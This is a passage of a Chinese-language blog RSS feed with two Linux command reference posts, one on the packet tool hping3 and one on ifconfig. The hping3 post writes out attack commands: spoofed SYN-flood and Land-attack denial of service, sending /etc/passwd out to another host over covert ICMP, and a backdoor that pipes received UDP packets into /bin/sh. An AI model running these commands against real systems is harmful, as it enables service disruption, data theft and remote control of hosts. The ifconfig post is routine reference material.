		<pubDate>Mon, 16 Jan 2023 14:37:32 +0000</pubDate>
				<category><![CDATA[IT]]></category>
		<category><![CDATA[Linux]]></category>
		<category><![CDATA[文章]]></category>
		<guid isPermaLink="false">http://space520.42web.io/?p=441</guid>

					<description><![CDATA[<p>hping3 测试网络及主机的安全 补充说明 hping&#160;是用于生成和解析TCPIP协议数据包的开源 [&#8230;]</p>
<p><a href="/archives/441">Linux-hping3</a>最先出现在<a href="/">时空之歌</a>。</p>
]]></description>
										<content:encoded><![CDATA[
<h1 class="wp-block-heading" id="hping3"><a href="https://linux.lylme.com/c/hping3.html#hping3"></a>hping3</h1>



<p>测试网络及主机的安全</p>



<h2 class="wp-block-heading" id="补充说明"><a href="https://linux.lylme.com/c/hping3.html#%E8%A1%A5%E5%85%85%E8%AF%B4%E6%98%8E"></a>补充说明</h2>



<p><strong>hping</strong>&nbsp;是用于生成和解析TCPIP协议数据包的开源工具。创作者是Salvatore Sanfilippo。目前最新版是hping3，支持使用tcl脚本自动化地调用其API。hping是安全审计、防火墙测试等工作的标配工具。hping优势在于能够定制数据包的各个部分，因此用户可以灵活对目标机进行细致地探测。</p>



<h3 class="wp-block-heading" id="安装"><a href="https://linux.lylme.com/c/hping3.html#%E5%AE%89%E8%A3%85"></a>安装</h3>



<pre class="wp-block-code"><code>yum install libpcap-devel tc-devel
ln -s /usr/include/pcap-bpf.h /usr/include/net/bpf.h
wget http://www.hping.org/hping3-20051105.tar.gz
tar zxvf hping3-20051105.tar.gz
cd hping3-20051105
./configure
make
make install
</code></pre>



<h3 class="wp-block-heading" id="选项"><a href="https://linux.lylme.com/c/hping3.html#%E9%80%89%E9%A1%B9"></a>选项</h3>



<pre class="wp-block-code"><code>-H --help 显示帮助。
-v -VERSION 版本信息。
-c --count count 发送数据包的次数 关于countreached_timeout 可以在hping2.h里编辑。
-i --interval 包发送间隔时间（单位是毫秒）缺省时间是1秒,此功能在增加传输率上很重要,在idle/spoofing扫描时此功能也会被用到,你可以参考hping-howto获得更多信息-fast 每秒发10个数据包。
-n -nmeric 数字输出，象征性输出主机地址。
-q -quiet 退出。
-I --interface interface name 无非就是eth0之类的参数。
-v --verbose 显示很多信息，TCP回应一般如：len=46 ip=192.168.1.1 flags=RADF seq=0 ttl=255 id=0 win=0 rtt=0.4ms tos=0 iplen=40 seq=0 ack=1380893504 sum=2010 urp=0
-D --debug 进入debug模式当你遇到麻烦时，比如用HPING遇到一些不合你习惯的时候，你可以用此模式修改HPING，（INTERFACE DETECTION,DATA LINK LAYER ACCESS,INTERFACE SETTINGS,.......）
-z --bind 快捷键的使用。
-Z --unbind 消除快捷键。
-O --rawip RAWIP模式，在此模式下HPING会发送带数据的IP头。
-1 --icmp ICMP模式，此模式下HPING会发送IGMP应答报，你可以用--ICMPTYPE --ICMPCODE选项发送其他类型/模式的ICMP报文。
-2 --udp UDP 模式，缺省下，HPING会发送UDP报文到主机的0端口，你可以用--baseport --destport --keep选项指定其模式。
-9 --listen signatuer hping的listen模式，用此模式，HPING会接收指定的数据。
-a --spoof hostname 伪造IP攻击，防火墙就不会记录你的真实IP了，当然回应的包你也接收不到了。
-t --ttl time to live 可以指定发出包的TTL值。
-H --ipproto 在RAW IP模式里选择IP协议。
-w --WINID UNIX ,WINDIWS的id回应不同的，这选项可以让你的ID回应和WINDOWS一样。
-r --rel 更改ID的，可以让ID曾递减输出，详见HPING-HOWTO。
-F --FRAG 更改包的FRAG，这可以测试对方对于包碎片的处理能力，缺省的“virtual mtu”是16字节。
-x --morefrag 此功能可以发送碎片使主机忙于恢复碎片而造成主机的拒绝服务。
-y -dontfrag 发送不可恢复的IP碎片，这可以让你了解更多的MTU PATH DISCOVERY。
-G --fragoff fragment offset value set the fragment offset
-m --mtu mtu value 用此项后ID数值变得很大，50000没指定此项时3000-20000左右。
-G --rroute 记录路由，可以看到详悉的数据等等，最多可以经过9个路由，即使主机屏蔽了ICMP报文。
-C --ICMPTYPE type 指定ICMP类型，缺省是ICMP echo REQUEST。
-K --ICMPCODE CODE 指定ICMP代号，缺省0。
--icmp-ipver 把IP版本也插入IP头。
--icmp-iphlen 设置IP头的长度，缺省为5（32字节）。
--icmp-iplen 设置IP包长度。
--icmp-ipid 设置ICMP报文IP头的ID，缺省是RANDOM。
--icmp-ipproto 设置协议的，缺省是TCP。
-icmp-cksum 设置校验和。
-icmp-ts alias for --icmptype 13 (to send ICMP timestamp requests)
--icmp-addr Alias for --icmptype 17 (to send ICMP address mask requests)
-s --baseport source port hping 用源端口猜测回应的包，它从一个基本端口计数，每收一个包，端口也加1，这规则你可以自己定义。
-p --deskport &#91;+]&#91;+]desk port 设置目标端口，缺省为0，一个加号设置为:每发送一个请求包到达后，端口加1，两个加号为：每发一个包，端口数加1。
--keep 上面说过了。
-w --win 发的大小和windows一样大，64BYTE。
-O --tcpoff Set fake tcp data offset. Normal data offset is tcphdrlen / 4.
-m --tcpseq 设置TCP序列数。
-l --tcpck 设置TCP ack。
-Q --seqnum 搜集序列号的，这对于你分析TCP序列号有很大作用。
</code></pre>



<h3 class="wp-block-heading" id="hping3功能"><a href="https://linux.lylme.com/c/hping3.html#hping3%E5%8A%9F%E8%83%BD"></a>Hping3功能</h3>



<p>Hping3主要有以下典型功能应用：</p>



<h3 class="wp-block-heading" id="-防火墙测试"><a href="https://linux.lylme.com/c/hping3.html#-%E9%98%B2%E7%81%AB%E5%A2%99%E6%B5%8B%E8%AF%95"></a># &nbsp;防火墙测试</h3>



<p>使用Hping3指定各种数据包字段，依次对防火墙进行详细测试。请参考：<a href="http://0daysecurity.com/articles/hping3_examples.html">http://0daysecurity.com/articles/hping3_examples.html</a></p>



<p>测试防火墙对ICMP包的反应、是否支持traceroute、是否开放某个端口、对防火墙进行拒绝服务攻击（DoS attack）。例如，以LandAttack方式测试目标防火墙（Land Attack是将发送源地址设置为与目标地址相同，诱使目标机与自己不停地建立连接）。</p>



<pre class="wp-block-code"><code>hping3 -S  -c 1000000 -a 10.10.10.10 -p 21 10.10.10.10
</code></pre>



<h3 class="wp-block-heading" id="-端口扫描"><a href="https://linux.lylme.com/c/hping3.html#-%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"></a># 端口扫描</h3>



<p>Hping3也可以对目标端口进行扫描。Hping3支持指定TCP各个标志位、长度等信息。以下示例可用于探测目标机的80端口是否开放：</p>



<pre class="wp-block-code"><code>hping3 -I eth0  -S 192.168.10.1 -p 80
</code></pre>



<p>其中<code>-I eth0</code>指定使用eth0端口，<code>-S</code>指定TCP包的标志位SYN，<code>-p 80</code>指定探测的目的端口。</p>



<p>hping3支持非常丰富的端口探测方式，nmap拥有的扫描方式hping3几乎都支持（除开connect方式，因为Hping3仅发送与接收包，不会维护连接，所以不支持connect方式探测）。而且Hping3能够对发送的探测进行更加精细的控制，方便用户微调探测结果。当然，Hping3的端口扫描性能及综合处理能力，无法与Nmap相比。一般使用它仅对少量主机的少量端口进行扫描。</p>



<h3 class="wp-block-heading" id="-idle扫描"><a href="https://linux.lylme.com/c/hping3.html#-idle%E6%89%AB%E6%8F%8F"></a># Idle扫描</h3>



<p>Idle扫描（Idle Scanning）是一种匿名扫描远程主机的方式，该方式也是有Hping3的作者Salvatore Sanfilippo发明的，目前Idle扫描在Nmap中也有实现。</p>



<p>该扫描原理是：寻找一台idle主机（该主机没有任何的网络流量，并且IPID是逐个增长的），攻击端主机先向idle主机发送探测包，从回复包中获取其IPID。冒充idle主机的IP地址向远程主机的端口发送SYN包（此处假设为SYN包），此时如果远程主机的目的端口开放，那么会回复SYN/ACK，此时idle主机收到SYN/ACK后回复RST包。然后攻击端主机再向idle主机发送探测包，获取其IPID。那么对比两次的IPID值，我们就可以判断远程主机是否回复了数据包，从而间接地推测其端口状态。</p>



<h3 class="wp-block-heading" id="-拒绝服务攻击"><a href="https://linux.lylme.com/c/hping3.html#-%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB"></a># 拒绝服务攻击</h3>



<p>使用Hping3可以很方便构建拒绝服务攻击。比如对目标机发起大量SYN连接，伪造源地址为192.168.10.99，并使用1000微秒的间隔发送各个SYN包。</p>



<pre class="wp-block-code"><code>hping3 -I eth0 -a192.168.10.99 -S 192.168.10.33 -p 80 -i u1000
</code></pre>



<p>其他攻击如smurf、teardrop、land attack等也很容易构建出来。</p>



<h3 class="wp-block-heading" id="-文件传输"><a href="https://linux.lylme.com/c/hping3.html#-%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93"></a># 文件传输</h3>



<p>Hping3支持通过TCP/UDP/ICMP等包来进行文件传输。相当于借助TCP/UDP/ICMP包建立隐秘隧道通讯。实现方式是开启监听端口，对检测到的签名（签名为用户指定的字符串）的内容进行相应的解析。在接收端开启服务：</p>



<pre class="wp-block-code"><code>hping3 192.168.1.159--listen signature --safe  --icmp
</code></pre>



<p>监听ICMP包中的签名，根据签名解析出文件内容。</p>



<p>在发送端使用签名打包的ICMP包发送文件：</p>



<pre class="wp-block-code"><code>hping3 192.168.1.108--icmp ?d 100 --sign signature --file /etc/passwd
</code></pre>



<p>将<code>/etc/passwd</code>密码文件通过ICMP包传给192.168.10.44主机。发送包大小为100字节（-d 100），发送签名为signature(-sign signature)。</p>



<h3 class="wp-block-heading" id="-木马功能"><a href="https://linux.lylme.com/c/hping3.html#-%E6%9C%A8%E9%A9%AC%E5%8A%9F%E8%83%BD"></a># 木马功能</h3>



<p>如果Hping3能够在远程主机上启动，那么可以作为木马程序启动监听端口，并在建立连接后打开shell通信。与netcat的后门功能类似。</p>



<p>示例：本地打开53号UDP端口（DNS解析服务）监听来自192.168.10.66主机的包含签名为signature的数据包，并将收到的数据调用/bin/sh执行。</p>



<p>在木马启动端：</p>



<pre class="wp-block-code"><code>hping3 192.168.10.66--listen signature --safe --udp -p 53 | /bin/sh
</code></pre>



<p>在远程控制端：</p>



<pre class="wp-block-code"><code>echo ls &gt;test.cmd
hping3 192.168.10.44 -p53 -d 100 --udp --sign siganature --file ./test.cmd
</code></pre>



<p>将包含ls命令的文件加上签名signature发送到192.168.10.44主机的53号UDP端口，包数据长度为100字节。</p>



<p>当然这里只是简单的演示程序，真实的场景，控制端可以利益shell执行很多的高级复杂的操作。</p>
<p><a href="/archives/441">Linux-hping3</a>最先出现在<a href="/">时空之歌</a>。</p>
]]></content:encoded>
					
					<wfw:commentRss>/archives/441/feed</wfw:commentRss>
			<slash:comments>0</slash:comments>
		
		
			</item>
		<item>
		<title>Linux-ifconfig</title>
		<link>/archives/438</link>
					<comments>/archives/438#comments</comments>
		
		<dc:creator><![CDATA[Space520]]></dc:creator>
		<pubDate>Mon, 16 Jan 2023 14:31:32 +0000</pubDate>
				<category><![CDATA[IT]]></category>
		<category><![CDATA[Linux]]></category>
		<category><![CDATA[文章]]></category>
		<guid isPermaLink="false">http://space520.42web.io/?p=438</guid>

					<description><![CDATA[<p>ifconfig 配置和显示Linux系统网卡的网络参数 补充说明 ifconfig命令&#160;被用于配置 [&#8230;]</p>
<p><a href="/archives/438">Linux-ifconfig</a>最先出现在<a href="/">时空之歌</a>。</p>
]]></description>
										<content:encoded><![CDATA[
<h1 class="wp-block-heading" id="ifconfig"><a href="https://linux.lylme.com/c/ifconfig.html#ifconfig"></a>ifconfig</h1>



<p>配置和显示Linux系统网卡的网络参数</p>



<h2 class="wp-block-heading" id="补充说明"><a href="https://linux.lylme.com/c/ifconfig.html#%E8%A1%A5%E5%85%85%E8%AF%B4%E6%98%8E"></a>补充说明</h2>



<p><strong>ifconfig命令</strong>&nbsp;被用于配置和显示Linux内核中网络接口的网络参数。用ifconfig命令配置的网卡信息，在网卡重启后机器重启后，配置就不存在。要想将上述的配置信息永远的存的电脑里，那就要修改网卡的配置文件了。</p>



<h3 class="wp-block-heading" id="语法"><a href="https://linux.lylme.com/c/ifconfig.html#%E8%AF%AD%E6%B3%95"></a>语法</h3>



<pre class="wp-block-code"><code>ifconfig(参数)
</code></pre>



<h3 class="wp-block-heading" id="参数"><a href="https://linux.lylme.com/c/ifconfig.html#%E5%8F%82%E6%95%B0"></a>参数</h3>



<pre class="wp-block-code"><code>add&lt;地址&gt;：设置网络设备IPv6的ip地址；
del&lt;地址&gt;：删除网络设备IPv6的IP地址；
down：关闭指定的网络设备；
&lt;hw&lt;网络设备类型&gt;&lt;硬件地址&gt;：设置网络设备的类型与硬件地址；
io_addr&lt;I/O地址&gt;：设置网络设备的I/O地址；
irq&lt;IRQ地址&gt;：设置网络设备的IRQ；
media&lt;网络媒介类型&gt;：设置网络设备的媒介类型；
mem_start&lt;内存地址&gt;：设置网络设备在主内存所占用的起始地址；
metric&lt;数目&gt;：指定在计算数据包的转送次数时，所要加上的数目；
mtu&lt;字节&gt;：设置网络设备的MTU；
netmask&lt;子网掩码&gt;：设置网络设备的子网掩码；
tunnel&lt;地址&gt;：建立IPv4与IPv6之间的隧道通信地址；
up：启动指定的网络设备；
-broadcast&lt;地址&gt;：将要送往指定地址的数据包当成广播数据包来处理；
-pointopoint&lt;地址&gt;：与指定地址的网络设备建立直接连线，此模式具有保密功能；
-promisc：关闭或启动指定网络设备的promiscuous模式；
IP地址：指定网络设备的IP地址；
网络设备：指定网络设备的名称。
</code></pre>



<h3 class="wp-block-heading" id="实例"><a href="https://linux.lylme.com/c/ifconfig.html#%E5%AE%9E%E4%BE%8B"></a>实例</h3>



<p><strong>显示网络设备信息（激活状态的）：</strong></p>



<pre class="wp-block-code"><code>&#91;root@localhost ~]# ifconfig
eth0      Link encap:Ethernet  HWaddr 00:16:3E:00:1E:51  
          inet addr:10.160.7.81  Bcast:10.160.15.255  Mask:255.255.240.0
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:61430830 errors:0 dropped:0 overruns:0 frame:0
          TX packets:88534 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000
          RX bytes:3607197869 (3.3 GiB)  TX bytes:6115042 (5.8 MiB)

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          UP LOOPBACK RUNNING  MTU:16436  Metric:1
          RX packets:56103 errors:0 dropped:0 overruns:0 frame:0
          TX packets:56103 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0
          RX bytes:5079451 (4.8 MiB)  TX bytes:5079451 (4.8 MiB)
</code></pre>



<p>说明：</p>



<p><strong>eth0</strong>&nbsp;表示第一块网卡，其中<code>HWaddr</code>表示网卡的物理地址，可以看到目前这个网卡的物理地址(MAC地址）是<code>00:16:3E:00:1E:51</code>。</p>



<p><strong>inet addr</strong>&nbsp;用来表示网卡的IP地址，此网卡的IP地址是<code>10.160.7.81</code>，广播地址<code>Bcast:10.160.15.255</code>，掩码地址<code>Mask:255.255.240.0</code>。</p>



<p><strong>lo</strong>&nbsp;是表示主机的回坏地址，这个一般是用来测试一个网络程序，但又不想让局域网或外网的用户能够查看，只能在此台主机上运行和查看所用的网络接口。比如把 httpd服务器的指定到回坏地址，在浏览器输入127.0.0.1就能看到你所架WEB网站了。但只是您能看得到，局域网的其它主机或用户无从知道。</p>



<ul>
<li>第一行：连接类型：Ethernet（以太网）HWaddr（硬件mac地址）。</li>



<li>第二行：网卡的IP地址、子网、掩码。</li>



<li>第三行：UP（代表网卡开启状态）RUNNING（代表网卡的网线被接上）MULTICAST（支持组播）MTU:1500（最大传输单元）：1500字节。</li>



<li>第四、五行：接收、发送数据包情况统计。</li>



<li>第七行：接收、发送数据字节数统计信息。</li>
</ul>



<p><strong>启动关闭指定网卡：</strong></p>



<pre class="wp-block-code"><code>ifconfig eth0 up
ifconfig eth0 down
</code></pre>



<p><code>ifconfig eth0 up</code>为启动网卡eth0，<code>ifconfig eth0 down</code>为关闭网卡eth0。ssh登陆linux服务器操作要小心，关闭了就不能开启了，除非你有多网卡。</p>



<p><strong>为网卡配置和删除IPv6地址：</strong></p>



<pre class="wp-block-code"><code>ifconfig eth0 add 33ffe:3240:800:1005::2/64    #为网卡eth0配置IPv6地址
ifconfig eth0 del 33ffe:3240:800:1005::2/64    #为网卡eth0删除IPv6地址
</code></pre>



<p><strong>用ifconfig修改MAC地址：</strong></p>



<pre class="wp-block-code"><code>ifconfig eth0 hw ether 00:AA:BB:CC:dd:EE
</code></pre>



<p><strong>配置IP地址：</strong></p>



<pre class="wp-block-code"><code>&#91;root@localhost ~]# ifconfig eth0 192.168.2.10
&#91;root@localhost ~]# ifconfig eth0 192.168.2.10 netmask 255.255.255.0
&#91;root@localhost ~]# ifconfig eth0 192.168.2.10 netmask 255.255.255.0 broadcast 192.168.2.255
</code></pre>



<p><strong>启用和关闭arp协议：</strong></p>



<pre class="wp-block-code"><code>ifconfig eth0 arp    #开启网卡eth0 的arp协议
ifconfig eth0 -arp   #关闭网卡eth0 的arp协议
</code></pre>



<p><strong>设置最大传输单元：</strong></p>



<pre class="wp-block-code"><code>ifconfig eth0 mtu 1500    #设置能通过的最大数据包大小为 1500 bytes
</code></pre>



<p><strong>其它实例</strong></p>



<pre class="wp-block-code"><code>ifconfig   #处于激活状态的网络接口
ifconfig -a  #所有配置的网络接口，不论其是否激活
ifconfig eth0  #显示eth0的网卡信息</code></pre>
<p><a href="/archives/438">Linux-ifconfig</a>最先出现在<a href="/">时空之歌</a>。</p>
]]></content:encoded>
					
					<wfw:commentRss>/archives/438/feed</wfw:commentRss>
			<slash:comments>2</slash:comments>
		
		
			</item>
	</channel>
</rss>
